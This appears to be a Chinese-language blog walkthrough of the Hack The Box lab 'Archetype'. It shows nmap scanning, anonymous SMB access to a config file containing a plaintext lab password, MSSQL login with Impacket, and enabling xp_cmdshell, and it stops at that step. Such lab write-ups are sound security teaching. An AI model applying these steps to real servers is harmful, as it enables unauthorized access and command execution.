@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Tier 2 第 3 台">
+<title>12. Archetype</title>
+
+<link rel='canonical' href='https://Sp1ke-sec.github.io/p/12.-archetype/'>
+
+<link rel="stylesheet" href="/scss/style.min.3dc2b87862416cdfa498393fe10f71a7856c63450472efbab1e94150643be501.css"><meta property='og:title' content="12. Archetype">
+<meta property='og:description' content="Tier 2 第 3 台">
+<meta property='og:url' content='https://Sp1ke-sec.github.io/p/12.-archetype/'>
+<meta property='og:site_name' content='Sp1ke-sec 安全博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-11-07T13:24:50&#43;08:00'/><meta property='article:modified_time' content='2026-11-07T13:24:50&#43;08:00'/><meta property='og:image' content='https://Sp1ke-sec.github.io/p/12.-archetype/assets/image-20261105144619258.png' />
+<meta name="twitter:title" content="12. Archetype">
+<meta name="twitter:description" content="Tier 2 第 3 台"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://Sp1ke-sec.github.io/p/12.-archetype/assets/image-20261105144619258.png' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu1489495842607495246.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🚭</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Sp1ke-sec 安全博客</a></h1>
+            <h2 class="site-description">这里是 Sp1ke-sec</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sp1ke-sec'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#task-1">Task 1</a></li>
+        <li><a href="#task-2">Task 2</a></li>
+        <li><a href="#task-3">Task 3</a>
+          <ol>
+            <li><a href="#task-4">Task 4</a></li>
+          </ol>
+        </li>
+        <li><a href="#task-5">Task 5</a></li>
+        <li><a href="#task-6">Task 6</a></li>
+        <li><a href="#task-7">Task 7</a></li>
+        <li><a href="#submit-user-flag">Submit User Flag</a></li>
+        <li><a href="#submit-root-flag">Submit Root Flag</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/12.-archetype/">
+                <img src="/p/12.-archetype/assets/image-20261105144619258_hu16095639385767222880.png"
+                        srcset="/p/12.-archetype/assets/image-20261105144619258_hu16095639385767222880.png 800w, /p/12.-archetype/assets/image-20261105144619258_hu2427437908175331736.png 1600w"
+                        width="800" 
+                        height="325" 
+                        loading="lazy"
+                        alt="Featured image of post 12. Archetype" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" style="background-color: #2a9d8f; color: #fff;">
+                HTB
+            </a>
+        
+            <a href="/categories/very-easy/" >
+                Very Easy
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/12.-archetype/">12. Archetype</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Tier 2 第 3 台
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-11-07</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 6 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="archetype">Archetype
+</h1><p><img src="/p/12.-archetype/assets/image-20261105144619258.png"
+	width="497"
+	height="202"
+	srcset="/p/12.-archetype/assets/image-20261105144619258_hu7717843665977595563.png 480w, /p/12.-archetype/assets/image-20261105144619258_hu6822922405888125769.png 1024w"
+	loading="lazy"
+	
+		alt="image-20261105144619258"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="246"
+		data-flex-basis="590px"
+	
+></p>
+<p>About: Archetype is a very easy Windows machine that features a misconfigured Microsoft SQL server, exposed SMB shares and sensitive data exposure. An exposed SMB share can be accessed without authentication in which sensitive files can be found containing plaintext credentials. These credentials can be used to authenticate to MSSQL as the service account user through Impacket&rsquo;s mssqlclient tool. Command execution can then be achieved by enabling xp_cmdshell after which a reverse shell can be uploaded and triggered to get access to the host. Finally, WinPeas can be used to search for vulnerabilities which reveals a Powershell history file containing the password needed to achieve full privilege escalation.</p>
+<p>介绍：Archetype 是一台非常简单的 Windows 机器，它存在 Microsoft SQL 服务器配置错误、SMB 共享暴露以及敏感数据泄露等问题。暴露的 SMB 共享无需身份验证即可访问，其中可能包含含有明文凭据的敏感文件。这些凭据可用于通过 Impacket 的 mssqlclient 工具以服务帐户用户身份对 MSSQL 进行身份验证。然后可以通过启用 xp_cmdshell 来实现命令执行，之后可以上传反向 shell 并触发以获取对主机的访问权限。最后，WinPeas 可用于搜索漏洞，从而发现包含实现完全权限提升所需密码的 PowerShell 历史记录文件。</p>
+<p>靶机 IP：10.129.95.187</p>
+<h3 id="task-1">Task 1
+</h3><blockquote>
+<p>Which TCP port is hosting a database server?</p>
+<p>数据库服务器运行在哪个 TCP 端口上？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nmap -Pn -sV -p 135,139,445,1433,5985 10.129.95.187 
+</span></span><span class="line"><span class="cl">Starting Nmap 7.99 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2026-11-05 01:52 -0500
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.129.95.187 <span class="o">(</span>10.129.95.187<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.59s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">135/tcp  open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds Microsoft Windows Server <span class="m">2008</span> R2 - <span class="m">2012</span> microsoft-ds
+</span></span><span class="line"><span class="cl">1433/tcp open  ms-sql-s     Microsoft SQL Server <span class="m">2017</span> 14.00.1000
+</span></span><span class="line"><span class="cl">5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OSs: Windows, Windows Server <span class="m">2008</span> R2 - 2012<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 14.96 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>MSSQL 默认实例开放在 1433/TCP 端口。</p>
+<p><strong>答案：1433</strong></p>
+<h3 id="task-2">Task 2
+</h3><blockquote>
+<p>What is the name of the non-Administrative share available over SMB?</p>
+<p>可通过 SMB 获取的非管理共享名称是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# smbclient -L //10.129.95.187 -N      
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        Sharename       Type      Comment
+</span></span><span class="line"><span class="cl">        ---------       ----      -------
+</span></span><span class="line"><span class="cl">        ADMIN$          Disk      Remote Admin
+</span></span><span class="line"><span class="cl">        backups         Disk      
+</span></span><span class="line"><span class="cl">        C$              Disk      Default share
+</span></span><span class="line"><span class="cl">        IPC$            IPC       Remote IPC
+</span></span><span class="line"><span class="cl">Reconnecting with SMB1 <span class="k">for</span> workgroup listing.
+</span></span><span class="line"><span class="cl">do_connect: Connection to 10.129.95.187 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Unable to connect with SMB1 -- no workgroup available
+</span></span><span class="line"><span class="cl">                                                                                             
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# smbclient -N //10.129.95.187/backups
+</span></span><span class="line"><span class="cl">Try <span class="s2">&#34;help&#34;</span> to get a list of possible commands.
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> dir
+</span></span><span class="line"><span class="cl">  .                                   D        <span class="m">0</span>  Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
+</span></span><span class="line"><span class="cl">  ..                                  D        <span class="m">0</span>  Mon Jan <span class="m">20</span> 07:20:57 <span class="m">2020</span>
+</span></span><span class="line"><span class="cl">  prod.dtsConfig                     AR      <span class="m">609</span>  Mon Jan <span class="m">20</span> 07:23:02 <span class="m">2020</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="m">5056511</span> blocks of size 4096. <span class="m">2613843</span> blocks available
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> get prod.dtsConfig
+</span></span><span class="line"><span class="cl">getting file <span class="se">\p</span>rod.dtsConfig of size <span class="m">609</span> as prod.dtsConfig <span class="o">(</span>0.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>答案：backups</strong></p>
+<h3 id="task-3">Task 3
+</h3><blockquote>
+<p>What is the password identified in the file on the SMB share?</p>
+<p>SMB共享文件中标识的密码是什么？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# cat prod.dtsConfig 
+</span></span><span class="line"><span class="cl">&lt;DTSConfiguration&gt;
+</span></span><span class="line"><span class="cl">    &lt;DTSConfigurationHeading&gt;
+</span></span><span class="line"><span class="cl">        &lt;DTSConfigurationFileInfo <span class="nv">GeneratedBy</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageName</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedFromPackageID</span><span class="o">=</span><span class="s2">&#34;...&#34;</span> <span class="nv">GeneratedDate</span><span class="o">=</span><span class="s2">&#34;20.1.2019 10:01:34&#34;</span>/&gt;
+</span></span><span class="line"><span class="cl">    &lt;/DTSConfigurationHeading&gt;
+</span></span><span class="line"><span class="cl">    &lt;Configuration <span class="nv">ConfiguredType</span><span class="o">=</span><span class="s2">&#34;Property&#34;</span> <span class="nv">Path</span><span class="o">=</span><span class="s2">&#34;\Package.Connections[Destination].Properties[ConnectionString]&#34;</span> <span class="nv">ValueType</span><span class="o">=</span><span class="s2">&#34;String&#34;</span>&gt;
+</span></span><span class="line"><span class="cl">        &lt;ConfiguredValue&gt;Data <span class="nv">Source</span><span class="o">=</span>.<span class="p">;</span><span class="nv">Password</span><span class="o">=</span>M3g4c0rp123<span class="p">;</span>User <span class="nv">ID</span><span class="o">=</span>ARCHETYPE<span class="se">\s</span>ql_svc<span class="p">;</span>Initial <span class="nv">Catalog</span><span class="o">=</span>Catalog<span class="p">;</span><span class="nv">Provider</span><span class="o">=</span>SQLNCLI10.1<span class="p">;</span>Persist Security <span class="nv">Info</span><span class="o">=</span>True<span class="p">;</span>Auto <span class="nv">Translate</span><span class="o">=</span>False<span class="p">;</span>&lt;/ConfiguredValue&gt;
+</span></span><span class="line"><span class="cl">    &lt;/Configuration&gt;
+</span></span><span class="line"><span class="cl">&lt;/DTSConfiguration&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>.dtsconfig</code> 属于 SQL Server SSIS 的旧版包配置文件，XML 格式。</p>
+<p>当 SSIS 包（<code>.dtsx</code>）跑的时候，从这个 xml 里读取参数、数据库连接串、账号密码。</p>
+<p>重点关注其中的 <code>&lt;ConfiguredValue&gt;</code> 字段，里面大概率存储明文密码。</p>
+<p><strong>答案：M3g4c0rp123</strong></p>
+<h4 id="task-4">Task 4
+</h4><blockquote>
+<p>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?</p>
+<p>Impacket 集合中的哪个脚本可以用来建立与 Microsoft SQL Server 的身份验证连接？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# ls /usr/share/doc/python3-impacket/examples/
+</span></span><span class="line"><span class="cl">addcomputer.py      getArch.py          mssqlinstance.py  sambaPipe.py
+</span></span><span class="line"><span class="cl">atexec.py           Get-GPPPassword.py  net.py            samedit.py
+</span></span><span class="line"><span class="cl">attrib.py           GetLAPSPassword.py  netview.py        samrdump.py
+</span></span><span class="line"><span class="cl">badsuccessor.py     GetNPUsers.py       ntfs-read.py      secretsdump.py
+</span></span><span class="line"><span class="cl">changepasswd.py     getPac.py           ntlmrelayx.py     services.py
+</span></span><span class="line"><span class="cl">CheckLDAPStatus.py  getST.py            owneredit.py      smbclient.py
+</span></span><span class="line"><span class="cl">dacledit.py         getTGT.py           ping6.py          smbexec.py
+</span></span><span class="line"><span class="cl">dcomexec.py         GetUserSPNs.py      ping.py           smbserver.py
+</span></span><span class="line"><span class="cl">describeTicket.py   goldenPac.py        psexec.py         sniffer.py
+</span></span><span class="line"><span class="cl">dpapi.py            karmaSMB.py         raiseChild.py     sniff.py
+</span></span><span class="line"><span class="cl">DumpNTLMInfo.py     keylistattack.py    rbcd.py           split.py
+</span></span><span class="line"><span class="cl">esentutl.py         kintercept.py       rdp_check.py      ticketConverter.py
+</span></span><span class="line"><span class="cl">exchanger.py        lookupsid.py        registry-read.py  ticketer.py
+</span></span><span class="line"><span class="cl">filetime.py         machine_role.py     reg.py            tstool.py
+</span></span><span class="line"><span class="cl">findDelegation.py   mimikatz.py         regsecrets.py     wmiexec.py
+</span></span><span class="line"><span class="cl">GetADComputers.py   mqtt_check.py       rpcdump.py        wmipersist.py
+</span></span><span class="line"><span class="cl">GetADUsers.py       mssqlclient.py      rpcmap.py         wmiquery.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/HTB/Archetype<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# impacket-mssqlclient ARCHETYPE/sql_svc:<span class="s1">&#39;M3g4c0rp123&#39;</span>@10.129.95.187 -windows-auth
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: <span class="m">16192</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed database context to <span class="s1">&#39;master&#39;</span>.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 1: Changed language setting to us_english.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="m">2017</span> RTM <span class="o">(</span>14.0.1000<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不加 <code>-windows-auth</code> 是 SQL 身份认证，把用户名、密码发给 MSSQL 内部的 SQL 登录库校验，比如 sa 账号这种。</p>
+<p>加 <code>-windows-auth</code> 走 Windows 的 NTLM 协议，把账号交给操作系统去校验，SQL Server 信任 Windows 的结果（可信连接）。我们拿到的账号是 Windows 服务账号，所以要用 windows 认证。</p>
+<p><strong>答案：mssqlclient.py</strong></p>
+<h3 id="task-5">Task 5
+</h3><blockquote>
+<p>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</p>
+<p>Microsoft SQL Server 的哪个扩展存储过程可以用来启动 Windows 命令 shell？</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SQL <span class="o">(</span>ARCHETYPE<span class="se">\s</span>ql_svc  dbo@master<span class="o">)</span>&gt; enable_xp_cmdshell
+</span></span><span class="line"><span class="cl">INFO<span class="o">(</span>ARCHETYPE<span class="o">)</span>: Line 185: Configuration option <span class="s1">&#39;show advanced options&#39;</span> changed from <span class="m">0</span> to 1. Run the RECONFIGURE statement to install.
